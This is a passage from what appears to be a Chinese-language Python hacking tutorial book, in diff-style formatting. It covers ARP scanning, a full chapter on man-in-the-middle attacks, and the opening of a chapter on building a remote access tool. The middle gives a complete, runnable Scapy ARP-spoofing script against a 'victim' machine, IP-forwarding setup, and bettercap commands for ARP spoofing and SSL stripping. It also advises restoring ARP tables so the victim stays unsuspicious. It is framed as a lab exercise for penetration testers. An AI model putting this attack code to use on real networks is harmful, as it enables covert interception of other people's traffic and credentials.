+  IP = \", ip, \" MAC = \", mac)\n```\n\n程序的输出如下所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_101_0.png)\n\
+  \nFigure 4.16 – ARP 扫描结果\n\n现在你可以看到网络中所有可用设备的 MAC 和 IP 地址。第三个，IP = 192.168.72.129\
+  \ 是我的 Windows 机器，我将在后面的章节中将其用作受害者/目标机器。为了验证我们在程序中获得的结果是否正确，我们可以从网络连接设置中手动检查这些字段：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_102_0.png)\n\nFigure 4.17 – 受害者的 IP 配置\n\
+  \n在这里，你可以看到我们在扫描中获得的结果与这些值相匹配。MAC 地址也请看一下。其他设备也可以看到。\n\n192.168.74.254 代表 DHCP 服务器。DHCP\
+  \ 服务器在设备配置为自动 IP 分配时为网络中的设备分配 IP 地址。192.168.72.2 代表网络中的默认网关。\n\n## 总结\n\n在本章中，我们学习了数据如何在网络上从一个设备发送到另一个设备。我们学习了数据如何在\
+  \ TCP/IP 协议中封装，以及每个报头中添加了哪些字段。接下来，我们学习了一个非常重要的网络操纵和数据包制作工具，称为 Scapy。我们还学习了如何使用 Scapy\
+  \ 制作数据包以及这些数据包如何通过网络发送。然后，我们学习了 ARP 协议，最后，我们创建了一个 ARP 扫描器来获取网络中活动设备的 IP 和 mac 地址。在下一章中，我们将学习如何使用此扫描器创建中间人攻击以拦截受害者机器的网络流量。\n"
+- "# 5\n中间人攻击\n\n在上一章中，我们学习了网络扫描。网络扫描是信息收集的一部分，允许用户查找本地网络中的主机。在本章中，我们将学习如何利用这些信息来攻击本地网络上的受害者。我们将在本章中涵盖以下主题：\n\
+  \n- 为什么我们需要 ARP？\n- 构建 ARP 欺骗程序\n- 监控流量\n- 加密流量\n- 手动恢复 ARP 表\n- 解密网络流量\n\n## 为什么我们需要\
+  \ ARP？\n\n在之前的章节中，我们提到过地址解析协议是什么。在本章中，我们将更深入地研究它。在本地网络中，通信在设备之间使用 MAC 地址而不是 IP 地址进行。这些也称为\
+  \ *链路层地址*。ARP 是一个请求响应协议，这意味着一个设备请求服务，另一个设备对该请求做出响应。假设网络中存在两个设备，没有外部互联网连接。为了让它们相互通信，它们需要依赖于底层协议，即所谓的第\
+  \ 2 层协议。我们已经简要学习过 ARP 表。通过使用 ARP 表，设备可以通过使用其 IP 和 MAC 地址的映射来维护网络上所有活动设备的列表。这种 ARP\
+  \ 表技术相当古老，并且是在没有考虑安全性的情况下设计的。它有一些固有的弱点可以被利用，我们将在后面的部分看到。\n\n## ARP 欺骗\n\n在学习 ARP\
+  \ 欺骗之前，让我们再看看 ARP。ARP 基本上是安装在你的 PC 上的一个程序，它会自动执行与 ARP 相关的所有任务，而无需用户输入。要从机器获取地址，它会在其请求中将\
+  \ FF:FF:FF:FF:FF:FF 作为广播地址放置。它这样做是为了将请求发送到网络中的所有活动设备，同时询问相关问题。随后，目标设备会用适当的答案回复。让我们看一下下面的图表，了解\
+  \ ARP 请求和响应是如何生成的：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_106_0.png)\n\nFigure\
+  \ 5.1 – ARP 请求和响应\n\n设备 A 发送请求，设备 B 用其 MAC 地址回复答案。看起来很简单，对吧？实际上，该协议存在设计缺陷。当设备 B\
+  \ 收到请求时，它无法知道请求设备提供的信息是否正确。通过这种方式，你可以轻松地欺骗数据包。稍后会详细介绍。\n\n让我们考虑一个简单的场景：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_107_0.png)\n\
+  \nFigure 5.2 – 互联网通信\n\n假设设备 A 想与基于互联网的设备通信。正如我们所知，它不能直接自行连接到互联网——它必须通过网关。设备的相应\
+  \ IP 和 MAC 地址显示在下面的图像中。设备 A 和网关维护自己的 ARP 表。为了让设备 A 向外部服务器发送请求，它将在自己的 ARP 表中查找网关设备的\
+  \ MAC 地址。一旦成功找到设备的 MAC 地址，它将向网关发送请求。这在前面的图表中用步骤 1 表示。如果本地网络中只有一个设备，设备 A 中的 ARP 表将如下所示：\n\
+  \n| Number | IP address | MAC address |\n|---|---|---|\n| 1 | 192.168.1.1 | 12:34:53:65:63:22\
+  \ |\n\nFigure 5.3 – 设备 A 中的 ARP 表\n\n现在，由于网关是本地网络和互联网之间的桥梁，我将为数据包找出外部 IP 地址。然后，使用其自己的外部或公共\
+  \ IP 地址，它将请求转发到位于 77.88.99.11 的服务器。这是步骤 2。服务器将处理请求并在步骤 3 中回复路由器。路由器将收到此回复并找出外部数据包应该去哪里。它是如何找出数据包应该去哪里？正如你可能猜到的那样，它将查看目标地址和目标端口。使用其自己的\
+  \ ARP 表，它将看到相应的设备位于何处。路由器中的 ARP 表将如下所示：\n\n| Number | IP | MAC |\n| --- | --- |\
+  \ --- |\n| 1 | 192.168.1.44 | 23:55:66:22:55:44 |\n\nFigure 5.4 – 路由器中的 ARP 表\n\n\
+  在步骤 4 中，路由器将简单地将回复转发给预期的接收者。\n\n到目前为止，我们已经了解了正常的请求响应是如何工作的。现在，我们将添加一个额外的参与者，称为黑客/渗透测试人员。\n\
+  \nARP 的工作方式如下。正如我们所知，设备不断地连接到网络和断开连接，因此 ARP 程序不会无限期地保留此 ARP 表。另一个原因是动态主机控制协议（DHCP）服务器会自动为网络中的设备分配\
+  \ IP 地址。因此，当设备离线时，IP地址会再次可用，以便可以分配给新连接的设备。出于这个原因，网络中的设备会定期向网络中的其他设备发送 ARP 响应，让它们知道其当前的\
+  \ IP 和 MAC 地址。这确保了所有设备都有 IP 和 MAC 地址的最新记录。现在，当设备收到 ARP 响应时，它会在没有任何身份验证或验证的情况下更新其\
+  \ ARP 表。你能看到这里的问题吗？如果设备创建包含虚假信息的 ARP 响应并将其发送给受害者/目标机器，接收设备将使用虚假信息更新其 ARP 表，而不会验证数据的正确性。ARP\
+  \ 协议的另一个弱点是，它允许我们接受响应，即使它没有发送请求。\n\n\n\n\n\n让我们看看当我们在网络中添加一个恶意行为者时会发生什么：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_109_0.png)\n\
+  \n## 图 5.5 – 向网络中添加攻击者\n\n在这里，属于黑客的设备 B 将生成两个伪造的 ARP 响应——一个针对受害者，一个针对网关路由器。它将向设备\
+  \ A 发送 arp 回复并假装成路由器。同样，它将向路由器发送回复并假装成设备 A。现在，设备 A 和路由器都将用这些新的伪造信息更新其 ARP 表。现在，如果设备\
+  \ A 向外部服务器发出与之前相同类型的请求，请求将不会去往路由器，而是会去往攻击者。攻击者然后可以选择将请求转发给路由器。此时，路由器会认为请求来自设备 A，而实际上请求来自设备\
+  \ B。设备 B 实际上是在拦截路由器与设备 A 之间的所有网络流量。还记得我们之前学过的 CIA 三要素吗？你能看出这里违反了哪条规则吗？这里的全部三条规则都可能被破坏，这取决于黑客打算如何使用这些信息。现在，黑客有效地成为了路由器与设备\
+  \ A 之间的中间人。这就是为什么它被称为中间人攻击（MITM）。这种漏洞非常知名，被称为 ARP 欺骗。\n\n> **重要提示**\n> \n> ARP 表会在一段时间后重置，因此只发送一个数据包进行欺骗是行不通的。为了能够在更长时间内成功欺骗，你需要不断发送这些伪造的制造数据包，以便\
+  \ ARP 表不会在一定时间后重置。\n\n## 构建 ARP 欺骗程序\n\n在本节中，我们将学习如何构建一个 ARP 欺骗程序。在继续之前，让我们再次查看\
+  \ Kali 以及 Windows 中的 ARP 表。Kali Linux 中的 ARP 表如下：\n\n```\n(venv) —(kali㉿kali)-[~/packet-book-code/example2-introduction-scapy]\n\
+  └─$ arp -a\n? (192.168.74.2) at 00:50:56:ff:74:8b [ether] on eth0\n? (192.168.74.254)\
+  \ at 00:50:56:f8:e6:bc [ether] on eth0\n? (192.168.74.129) at 00:0c:29:be:47:14\
+  \ [ether] on eth0\n```\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_110_0.png)\n\n\
+  Windows 中的 ARP 表如下所示。请查看突出显示的字段：\n\n```\nC:\\Users\\fahad-sarwar>arp -a\n\nInterface:\
+  \ 192.168.74.129 --- 0xc\n  Internet Address      Physical Address      Type\n \
+  \ 192.168.74.2          00-50-56-ff-74-8b     dynamic\n  192.168.74.128        00-0c-29-90-79-02\
+  \     dynamic\n  192.168.74.255        ff-ff-ff-ff-ff-ff     static\n  224.0.0.22\
+  \            01-00-5e-00-00-16     static\n  224.0.0.251           01-00-5e-00-00-fb\
+  \     static\n  224.0.0.252           01-00-5e-00-00-fc     static\n  239.255.255.250\
+  \       01-00-5e-7f-ff-fa     static\n  255.255.255.255       ff-ff-ff-ff-ff-ff\
+  \     static\n```\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_110_1.png)\n\n正如你所见，它们为位于\
+  \ 192.168.74.2 的路由器提供了正确的 MAC 地址。Kali 位于 192.168.74.128，而 Windows 10 位于 192.168.74.129。\n\
+  \n为了欺骗这些设备，我们将逐步解决这个问题。首先，我们将处理用路由器的 MAC 地址欺骗受害者机器。\n\n## Arp 欺骗项目\n\n在 Kali Linux\
+  \ 中打开 VS Code 并创建一个名为 ARP spoof 的新项目。按照第 2 章《入门 – 设置实验环境》所示安装虚拟环境。一旦虚拟环境安装完成，通过编写以下命令启用虚拟环境：\n\
+  \n```\nsource venv/bin/activate\n```\n\n这将激活新的虚拟环境。在此环境中安装 Scapy 模块并创建一个名为 main.py\
+  \ 的新文件。\n\n为了在一行中导入所有 scapy 模块，而无需分别显式导入每一个，你可以编写以下行：\n\n```\nfrom scapy.all import\
+  \ *\n```\n\n* 表示我们想要导入 scapy 中存在的所有模块。正如我们在上一节中所学到的，要进行欺骗，我们必须创建伪造的响应。首先，我们将创建一个\
+  \ intended for the victim 的响应。为此，我们将创建一个 arp 数据包并查看其中可以设置哪些字段。要创建 ARP 数据包并查看其中存在的字段，我们可以编写以下代码：\n\
+  \n```\narp_response = ARP()\nprint(arp_response.show())\n```\n\n此代码的输出如下所示：\n\n\
+  ![](img/d31345bbfd15f63be2920f0de5fa30dc_111_0.png)\n\n图 5.8 – ARP 数据包字段\n\n我们感兴趣的字段从\
+  \ op 开始。Op 代表操作或数据包类型。这是一个 who has 操作，这意味着它是一个 ARP 请求。但我们感兴趣的是创建 ARP 响应而不是请求。hwsrc\
+  \ 是 Kali 机器的 MAC 地址，同样，psrc 是其 IP 地址。hwdst 和 pdst 尚未为此数据包设置。现在，我们将对该数据包进行以下修改以欺骗受害者：\n\
+  \n- 将 op 改为 2，表示这是一个响应 ARP 数据包，而不是请求。注意，默认情况下此值为 1，表示它对应于 who-has 操作。\n- 更改 psrc\
+  \ 地址字段，使其等于路由器的 IP 地址值。由于我们的路由器位于 192.168.72.2，我们将此字段设置为此值。\n- 最后，我们将 pdst 设置为受害者机器的\
+  \ ip 地址，即 192.168.74.129。我们还将设置 hwdst 地址，即受害者的 MAC 地址。\n\n要查看 Windows 机器的 MAC 地址，你可以在命令提示符中编写以下命令，或使用我们在上一章中创建的网络扫描器：\n\
+  \n```\nIpconfig /all\n```\n\n一旦你获得了必要的信息，请继续在 Python 中进行以下更改：\n\n```\narp_response.op\
+  \ = 2\narp_response.pdst = \"192.168.74.129\" // windows IP\narp_response.hwdst\
+  \ = \"00:0C:29:BE:47:14\"      // windows mac\narp_response.hwsrc = \"00:0c:29:90:79:02\"\
+  \      // kali mac\narp_response.psrc = \"192.168.74.2\"   // fake field value\n\
+  ```\n\n只有最后一个字段是伪造的；我们将从 192.168.74.128 发送它，同时假装在 192.168.74.2。一旦所有字段都已设置，你可以打印它们以查看它们是否已正确定义：\n\
+  \n```\nprint(arp_response.show())\n```\n\n以下屏幕截图显示了根据我们之前编写的代码进行的欺骗数据包：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_113_0.png)\n\
+  \n图 5.9 – 欺骗的 ARP 数据包\n\n在这里，你可以看到 op 字段现在是响应而不是请求。字段值现在是 is-at。同样，psrc 字段假装是路由器的\
+  \ IP 而不是 Kali。请注意，我们还没有发送数据包。要发送此数据包，我们可以简单地使用 send 函数：\n\n```\nsend(arp_response)\n\
+  ```\n\n现在，如果你运行此程序并在 arp 表重置之前迅速转到 Windows 机器，你会看到 Windows 机器的 arp 表已被污染，其 arp 表条目显示了\
+  \ 192.168.72.2 网关的错误 MAC 地址。不是指向实际网关，它现在指向 Kali 的 MAC 地址：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_113_1.png)\n\
+  \n图 5.10 – Windows 中被污染的 ARP 表\n\n将其与图 5.6 中 192.168.74.2 的值进行比较。在这里，你可以看到此新表中物理地址的值已被修改。请注意，如果你花费太长时间查看此值，它将自动重置。我们将在稍后学习如何防止它在更长的欺骗期间自动重置。\n\
+  \n现在，让我们创建一个函数，以便我们可以轻松调用它：\n\n```\ndef spoof_victim():\n    arp_response = ARP()\n\
+  \    arp_response.op = 2\n    arp_response.pdst = \"192.168.74.129\"\n    arp_response.hwdst\
+  \ = \"00:0C:29:BE:47:14\"\n    arp_response.hwsrc = \"00:0c:29:90:79:02\"\n    arp_response.psrc\
+  \ = \"192.168.74.2\"\n    send(arp_response)\n```\n\n我们还将创建一个类似的函数来欺骗路由器：\n\n```\n\
+  def spoof_router():\n    arp_response = ARP()\n    arp_response.op = 2\n    arp_response.pdst\
+  \ = \"192.168.74.2\" // router's IP\n    arp_response.hwdst = \"00:50:56:ff:74:8b\"\
+  \ // router's mac\n    arp_response.hwsrc = \"00:0c:29:90:79:02\" // kali's mac\n\
+  \    arp_response.psrc = \"192.168.74.129\" // fake pretending to be device A.\n\
+  \    send(arp_response)\n```\n\n在此函数中，我们更改了 pdst、hwdst 和 psrc 的值。\n\n完整的程序如下：\n\n\
+  ```\nfrom scapy.all import *\n\ndef spoof_victim():\n    arp_response = ARP()\n\
+  \    arp_response.op = 2\n    arp_response.pdst = \"192.168.74.129\"\n```\n\n\n\n\
+  arp_response.hwdst = \"00:0C:29:BE:47:14\"\narp_response.hwsrc = \"00:0c:29:90:79:02\"\
+  \narp_response.psrc = \"192.168.74.2\"\nsend(arp_response)\n\ndef spoof_router():\n\
+  \    arp_response = ARP()\n    arp_response.op = 2\n    arp_response.pdst = \"192.168.74.2\"\
+  \n    arp_response.hwdst = \"00:50:56:ff:74:8b\"\n    arp_response.hwsrc = \"00:0c:29:90:79:02\"\
+  \n    arp_response.psrc = \"192.168.74.129\"\n    send(arp_response)\n\nif __name__\
+  \ == \"__main__\":\n    spoof_victim()\n    spoof_router()\n\n请注意，这只会欺骗这些设备一次。要创建永久欺骗，我们可以将这些函数调用添加到循环中，并在一定的延迟后持续发送这些数据包。这样，ARP\
+  \ 表就不会有机会重置，只要你的欺骗程序在运行，你就可以永久欺骗这些设备。\n\n我们也可以尝试在循环中加入退出条件。我们将使用 KeyboardInterrupt\
+  \ 来退出。使用以下代码在每隔 2 秒的延迟后持续发送数据包：\n\n```\ntry:\n    while True:\n        spoof_victim()\n\
+  \        spoof_router()\n        time.sleep(2)\nexcept KeyboardInterrupt as err:\n\
+  \    print(\"exiting\")\n```\n\n请注意，你需要在文件的顶部导入 time 模块。虽然我们的欺骗程序看起来已经完成，但有一个小问题——如果受害者现在尝试请求互联网服务器，他们将看到互联网连接问题。在\
+  \ Linux 上运行 arp 欺骗程序，然后去 Windows 机器尝试访问一个网站。你会看到类似如下的窗口：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_116_0.png)\n\
+  \n图 5.11 – 无连接\n\n这是因为数据包正在前往 Kali 机器，但它阻止了数据包被转发。要启用数据包转发，在你的 Linux 终端上运行以下命令：\n\
+  \n```\nsysctl -w net.ipv4.ip_forward=1\n```\n\n这将在 Kali 机器上启用 IP 转发。现在，Windows 用户将能够在完全没有察觉有人拦截其流量的情况下访问互联网：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_116_1.png)\n\n图 5.12 – 启用 IPv4 转发\n\n\
+  现在，如果你去 Windows 机器再次尝试访问一个网站，你应该有互联网连接。现在，你的欺骗程序应该能完美运行。\n\n## 监控流量\n\n要查看用户在做什么，你可以在\
+  \ Kali 上打开 *Wireshark* 并选择 `eth0` 接口以查看网络上所有经过的流量。要仅查看来自 Windows 机器的流量，你可以在过滤器菜单中设置一个过滤器。使用以下过滤器：\n\
+  \n```\nip.src == 192.168.74.129\n```\n\n这将只显示源自 Windows 机器的流量。现在，如果你去 Windows 机器并访问一个网站，你应该能在\
+  \ Wireshark 中看到数据包到达：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_117_0.png)\n\n\
+  图 5.13 – 来自 Windows 机器的 Wireshark 流量\n\n在本节中，我们学习了如何中毒 ARP 表并监控受害设备与互联网之间的网络流量。在下一节中，我们将学习这种网络流量是如何加密的，以及这种加密是如何被破解的。\n\
+  \n## 加密流量\n\n在互联网早期，互联网流量大多基于文本，因此在网络上嗅探的任何人都可以清楚地看到正在传输的内容。这极不安全，人们无法在网络上传输密码等敏感信息。自那以后，互联网已经取得了长足的进步。现在，除了一些非常老旧的网站外，大多数互联网流量都是安全的并使用加密。这意味着即使你可以看到流量，你也无法读取它，因为它是加密的。如果你在网站的\
+  \ URL 上看到 `https` 标签，这意味着网络流量是加密的，无法在传输中被读取。有工具可以用来解密这种流量。\n\n## 手动恢复 ARP 表\n\n\
+  现在我们已经看到了如何成功欺骗数据包，当我们使用键盘中断（如 Ctrl + C）关闭程序时，我们会发现 Windows 机器上的互联网再次变得不可用。这是因为\
+  \ ARP 表已被中毒，我们没有恢复它们，因此它们不知道如何路由网络流量。这会在几分钟后自动重置。然而，这可能会引起受害者的怀疑，他们可能会意识到有人在篡改他们的网络流量。为了避免这种情况，我们可以在退出程序时发送正确的信息来恢复这些表。我们可以使用以下程序来恢复正确的值：\n\
+  \n```\ndef restore():\n    # restoring router table\n    arp_response = ARP()\n\
+  \    arp_response.op = 2\n    arp_response.pdst = \"192.168.74.2\"\n    arp_response.hwdst\
+  \ = \"00:50:56:ff:74:8b\"\n    arp_response.hwsrc = \"00:0C:29:BE:47:14\"\n    arp_response.psrc\
+  \ = \"192.168.74.129\"\n    send(arp_response)\n    #restoring windows table\n \
+  \   arp_response = ARP()\n    arp_response.op = 2\n    arp_response.pdst = \"192.168.74.129\"\
+  \n    arp_response.hwdst = \"00:0C:29:BE:47:14\"\n    arp_response.hwsrc = \"00:50:56:ff:74:8b\"\
+  \n    arp_response.psrc = \"192.168.74.2\"\n    send(arp_response)\n```\n\n请注意，这些值是针对我的平台的；它们在你的平台上会不同，因此你应相应地更改这些值。要恢复\
+  \ ARP 表，从我们的 Linux 机器向路由器发送这些值，同时假装是设备 A。这次，不要输入虚假信息，输入正确的值。对 Windows 机器做同样的操作。最后，在发生键盘中断时调用此函数，如下所示：\n\
+  \n```\ntry:\n    while True:\n        spoof_victim()\n        spoof_router()\n \
+  \       time.sleep(2)\nexcept KeyboardInterrupt as err:\n    print(\"restoring ARP\
+  \ tables\")\n    restore()\n    print(\"exiting\")\n```\n\n在本节中，我们学习了如何中毒 ARP 表、监控网络流量，以及在受害机器中恢复\
+  \ ARP 表以确保他们不会怀疑我们的活动。接下来，我们将学习如何解密这种网络流量。\n\n## 解密网络流量\n\n正如我们在上一节中看到的，我们可以使用中间人攻击来拦截流量。然而，这种攻击单独使用很少有用，因为现在的浏览器流量都是加密的，所以即使你能够拦截流量，你也做不了太多。你可以通过使用\
+  \ SSL 剥离来绕过此过程。拦截未加密的流量有时也很实用，当你想监控用户的活动时。这可以帮助你找出用户访问最多的网站。将此信息与社会工程攻击结合使用可以帮助你入侵受害者的机器。\n\
+  \n## HTTPS 与 HTTP\n\n要理解 SSL 剥离的工作原理，我们需要了解超文本传输协议 HTTP 和 HTTPS 协议的工作原理。HTTPS 是\
+  \ HTTP 的安全版本，正如其名称末尾的 S 所指示的那样。它是在互联网早期开发的，当时信息以人类可读文本的形式发送，任何拦截或监控流量的人都可能看到正在发生的事情。\n\
+  \n一个典型的 **HTTP** 请求看起来像这样：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_120_0.png)\n\
+  \n图 5.14 – HTTP 请求\n\n正如你所见，HTTP 请求的主体是以纯文本形式存在的，这意味着它可以被轻松读取。因此，如果你以明文形式向服务器发送你的电子邮件或密码，黑客可能窃取你的凭据。你已经知道这有多危险。为了避免这个问题，开发了\
+  \ HTTPS，它可以加密消息的主体，以便只有服务器和请求方可以用正确的加密密钥读取它——中间人无法读取它。一旦服务器收到请求，它将以适当的回复进行响应。服务器的回复看起来像这样：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_120_1.png)\n\n图 5.15 – HTTP 回复\n\n最后一行代表回复的主体，即用户请求的网页。在\
+  \ HTTPS 的情况下，这些请求和响应的 *主体* 将被加密，对攻击者来说看起来像乱码。现在，让我们专注于如何绕过它。\n\n\n\n\n\n## 绕过 HTTPS\n\
+  \n尽管如今大多数网站都支持 HTTPS 而非 HTTP，但在服务器端，为了保持向后兼容，服务器仍然允许请求来自 *HTTP*，一旦收到请求，就会检查客户端/请求方是否支持\
+  \ HTTPS。我们可以利用这一点来绕过此安全机制。下面的图表展示了 HTTP 请求与 Web 服务器的工作方式：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_121_0.png)\n\
+  \n图 5.16 – HTTP 循环\n\n当客户端首次访问一个网站时，通常使用 HTTP 协议，因此它会发送一个不安全的请求来建立连接。服务器收到此请求后，会询问客户端是否支持\
+  \ HTTPS。如果客户端支持 HTTPS，服务器会说，*为什么不通过 HTTPS 与我交谈呢？*。客户端随后切换到 *HTTPS*。一旦发生这种情况，所有的通信都会被加密。\n\
+  \n这就是我们引入中间人 *攻击者* 的地方。我们将以一种欺骗服务器和客户端的方式进行。让我们看一下下面的图表：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_122_0.png)\n\
+  \n图 5.17 – 使用 SSL 剥离的 MITM 攻击\n\n在第一阶段，客户端会向服务器发出 HTTP 请求。攻击者坐在客户端和服务器之间，并使用我们在上一章中开发的\
+  \ arp spoofing 程序来监控流量。他们会从客户端获取此请求，将其转换为 HTTPS 请求，然后转发给服务器。服务器会认为客户端是通过 HTTPS 而非\
+  \ HTTP 在交谈。同样，攻击者会接收来自服务器的回复，对其解密并读取正在发生的事情。完成之后，他们会将回复转发给受害者/客户端。这样，受害者会认为服务器是通过\
+  \ HTTP 交谈，而服务器会认为客户端是通过 HTTPS 交谈。与此同时，攻击者正在读取所有网络流量。\n\n攻击者的工作是加密和解密服务器用于在传输层进行身份验证的\
+  \ SSL 证书。它们构成了安全通信的基础。学习如何执行 SSL 剥离超出了本书的范围，因为它需要广泛的网络知识，这本身就可以是一本书。我们的目标是使用此工具来破坏系统。我们将使用一个著名的\
+  \ SSL 剥离工具 bettercap 来实现。我们将使用版本 2.23。请注意，此组件的最新工具似乎无法正常工作。它可以在 https://github.com/bettercap/bettercap/releases/download/v2.23/bettercap_linux_amd64_2.23.zip\
+  \ 获取。\n\n下载此工具并在 Linux 上运行。\n\n下载后，将此压缩文件放在 Kali Linux 上的所需位置并解压模块。你会看到一个名为 bettercap\
+  \ 的可执行文件。你可以直接运行此可执行文件，它会正常工作。然而，我建议将其放在 /usr/bin/ 目录中，以便你可以从任何地方访问它，因此将此文件复制到 /usr/bin/。\n\
+  \n要复制文件，请使用以下命令：\n\n```\nsudo cp bettercap /usr/bin/bettercap\n```\n\n复制后，只需打开一个终端并输入\
+  \ bettercap 即可运行文件。在继续之前，我们需要做几件事来启动它。输入以下命令：\n\n```\nsudo bettercap\n```\n\n界面将如下所示：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_123_0.png)\n\n接下来，你需要更新一些内容；即此模块的一些内部文件，称为\
+  \ caplets。别担心——你在这里不需要了解太多关于 caplets 的内容。只需输入以下命令，让魔法发生即可：\n\n```\ncaplets.update\n\
+  ```\n\n这将下载一些文件并更新它们。\n\n退出此程序以使更改生效。现在，让我们再次使用以下命令运行程序：\n\n```\nsudo bettercap\
+  \ --silent -iface eth0\n```\n\n此命令将以静默模式运行 bettercap，同时使用 eth0 作为其主要网络接口。要查看网络上有哪些设备可用，你可以输入以下命令：\n\
+  \n```\nnet.probe on\n```\n\n此命令的输出将如下所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_124_0.png)\n\
+  \n图 5.19 – 网络上的活动主机\n\n让我们尝试为此应用程序使用内部 arpspoof 程序。输入以下命令为我们的 Windows 机器设置 arp spoofing：\n\
+  \n```\nset arp.spoof.targets 192.168.74.129\n```\n\n这将设置受害者。要启动 arp spoofing 程序，我们可以输入以下命令：\n\
+  \n```\nset arp.spoof.internal true\n```\n\n```\nset arp.spoof on\n```\n\n这将开始欺骗设备：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_124_1.png)\n\n图 5.20 – 设备欺骗\n\n此时，我们来到了\
+  \ SSL 剥离部分。要开始剥离 HTTPS 流量，我们需要转到 Windows 机器并清除所有浏览历史记录。这将确保我们不会加载网站的缓存版本。\n\n如果你想查看\
+  \ bettercap 上正在运行哪些服务，可以使用以下帮助命令：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_125_0.png)\n\
+  \n图 5.21 – 帮助命令\n\n接下来，要查看原始 HTTP 流量，运行以下命令：\n\n```\nhstshijack/hstshijack\n```\n\
+  \n这将开始剥离流量。现在，如果你转到 Windows 机器并访问 google.com 等网站，你会看到网站连接是不安全的。如果你访问 google.com，你会注意到\
+  \ URL 前有一个 Not secure 标签。\n\n你现在应该拥有一个不安全的 Google 版本。如果你转到运行 bettercap 的 Kali Linux\
+  \ 终端，你应该能看到网络流量。\n\n**注意！**\n请注意，像 Google、Facebook 等大公司在安全上花费了巨额资金，并不断努力改进其保护方法，因此今天有效的攻击明天可能就不起作用了。这就是为什么渗透测试人员和网络安全防御团队不断处于追逐游戏中。前面示例的目标是展示这些方法在实践中如何运作。到你自己使用时，情况可能已经改变，此攻击方法可能有效也可能无效。保持更新非常重要。本书的目的是不是让你困在特定工具的使用上，而是向你展示渗透测试人员和安全分析师的思考方式。\n\
+  \n## 总结\n\n在本章中，我们在上一章学到的知识基础上，使用它构建了一个 ARP spoof 程序，使我们能够拦截本地网络上的流量。然后，我们学习了 HTTP\
+  \ 和 HTTPS 协议的工作原理，以及它们如何被中间人攻击破坏。\n\n在下一章中，我们将探讨一个更令人兴奋的话题：恶意软件开发。这可以帮助我们手动接管受害者的机器并在其上执行某些任务。通过这样做，我们将学习如何构建恶意软件\
+  \ **远程访问工具** 来控制受害者的计算机。我们将构建一个程序，使我们能够远程接管受害者的机器并在其上执行多个任务。下一章见！\n"
+- '# 第三部分：
+
+  恶意软件
+
+  开发
+
+
+  在本节中，我们将转向一个新主题。我们将从恶意软件开发过程开始，以及如何使用 Python 创建自己的恶意软件。创建自己的恶意软件是道德黑客攻击中非常重要的一方面。在第
+  6 章《恶意软件开发》中，我们将使用套接字编程创建一个非常基础的恶意软件远程访问工具。这将使你能够开发可用于入侵受害者机器的恶意软件。在第 7 章《高级恶意软件》中，我们将在恶意软件中开发更高级的功能，例如从受害者机器窃取敏感文件的能力，等等。在第
+  8 章《后利用》中，我们将讨论后利用的方面，即一旦你获得对受害者机器的访问权限后可以做的事情。最后一章涉及系统保护——如何保护你的系统免受攻击，以及黑客利用哪些弱点来控制你的系统。我们还将讨论如何使你的恶意软件持久化并在你想要时控制受害者机器。
+
+
+  本书的这一部分包含以下章节：
+
+
+  - 第 6 章，恶意软件开发
+
+  - 第 7 章，高级恶意软件
+
+  - 第 8 章，后利用
+
+  - 第 9 章，系统保护与持久化
+
+
+
+
+
+  '
+- "# 6\n\n## 恶意软件开发\n\n在之前的章节中，我们学习了如何收集与用户相关的信息以及这些信息如何被用来攻击受害者。在本章中，我们将进入一个新的维度并开发一个远程访问工具（RAT）。RAT\
+  \ 允许渗透测试人员远程访问受害者的计算机，并在网络安全领域被广泛使用。互联网上存在着更多更先进的 RAT 程序。然而，本章的目标是帮助你构建自己的 RAT，这将赋予你更高级的控制权。\n\
+  \n在本章中，我们将涵盖以下主题：\n\n- RAT 简介\n- Python 中的 Socket 编程\n- 创建恶意软件\n- 在受害者上远程运行命令\n\n\
+  ## 理解 RAT\n\nRAT 在网络安全中已被广泛使用，并且存在许多流行的 RAT。一些黑客甚至提供定制且难以检测的 RAT 以用于获取对受害者计算机的访问权。在最简单的形式中，RAT\
+  \ 是一种与另一台计算机建立网络连接并执行操作的程序。RAT 可以是合法软件，例如常见的商业软件如 TeamViewer，通常由 IT 专业人员用来诊断远程计算机并检测问题。然而，这些程序也可能被黑客用来控制受害者的机器，因此你在使用这些程序时应非常谨慎。\n\
+  \n在最简单的形式中，RAT 是一对程序。一个程序运行在受害者上，而另一个程序运行在攻击者的机器上。这些程序的工作方式有两种主要配置，取决于谁发起通信。定义如下：\n\
+  \n- 攻击者发起连接的程序，称为 **正向连接**\n- 导致受害者机器向黑客机器建立连接的程序，称为 **反向连接**\n\n让我们在以下章节中详细了解这些。\n\
+  \n## 正向 Shell\n\n在现代计算机系统中，正向连接几乎是不可能的，因为大多数 PC 的安全配置不允许远程设备发起连接，除非防火墙中有特定规则。默认情况下，所有传入连接都被防火墙阻止。这些连接只有在受害者机器上存在可被黑客利用的开放端口时才有可能。然而，你会发现这在大多数典型场景中并非如此。\n\
+  \n## 反向 Shell\n\n反向 Shell 采用相反的方法。攻击者不会向受害者发起连接，而是会在受害者机器上植入恶意软件/有效载荷（在受害者机器上执行的代码）。这样，与外部连接不同，内部连接将由受害者发起，这使得\
+  \ **入侵检测系统（IDSes）** 如防火墙和防病毒程序更难以检测系统上的恶意活动。这种攻击的部署方式是攻击者向受害者发送包含恶意软件的恶意文件，例如嵌入在\
